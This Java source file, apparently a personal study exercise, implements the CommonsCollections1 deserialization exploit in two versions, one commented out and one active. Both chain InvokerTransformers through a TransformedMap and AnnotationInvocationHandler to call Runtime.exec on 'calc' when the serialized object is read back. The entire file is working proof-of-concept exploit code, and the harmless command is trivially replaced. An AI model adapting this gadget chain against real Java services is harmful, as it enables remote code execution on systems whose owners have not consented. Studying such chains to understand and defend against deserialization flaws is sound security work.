package com.yutao.day8;
//package com.yutao.day8;
//

//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.functors.ChainedTransformer;
//import org.apache.commons.collections.functors.ConstantTransformer;
//import org.apache.commons.collections.functors.InvokerTransformer;
//import org.apache.commons.collections.map.TransformedMap;
////import sun.reflect.annotation.AnnotationInvocationHandler;
////import javax.xml.transform.Transformer;
//import java.io.*;
//import java.lang.annotation.Retention;
//import java.lang.reflect.Constructor;
//import java.lang.reflect.InvocationHandler;
//import java.util.HashMap;
//import java.util.Map;
//
//public class CommonsCollections1 {
//    public static void main(String[] args) throws Exception {
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer(
//                        "getMethod",
//                        new Class[]{String.class, Class[].class},
//                        new Object[]{"getRuntime", new Class[0]}),
//                new InvokerTransformer(
//                        "invoke",
//                        new Class[]{Object.class, Object[].class},
//                        new Object[]{null, new Object[0]}),
//                new InvokerTransformer("exec", new Class[]{String.class},
//                        new String[]{"calc"}),};
//
//        Transformer transformerChain = new ChainedTransformer(transformers);
//        Map innerMap = new HashMap();
//        innerMap.put("value", "xxxx");
//
//        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
//
//        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
//        construct.setAccessible(true);
//
//        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
//
//        FileOutputStream barr = new FileOutputStream("11.ser");
//        ObjectOutputStream oos = new ObjectOutputStream(barr);
//        oos.writeObject(handler);
//        oos.close();
//        System.out.println(barr);
//
//        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("11.ser"));
//        Object o = (Object) ois.readObject();
//    }
//}
//

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.AnnotationFormatError;
import java.lang.annotation.IncompleteAnnotationException;
import java.lang.annotation.Native;
import java.lang.annotation.Target;
import java.lang.reflect.AnnotatedArrayType;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.io.*;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections1 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };

        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap<>();
        map.put("value", "aaa");

        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationhdlConstructor.setAccessible(true);
        Object o = annotationInvocationhdlConstructor.newInstance(Target.class, transformedMap);


        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}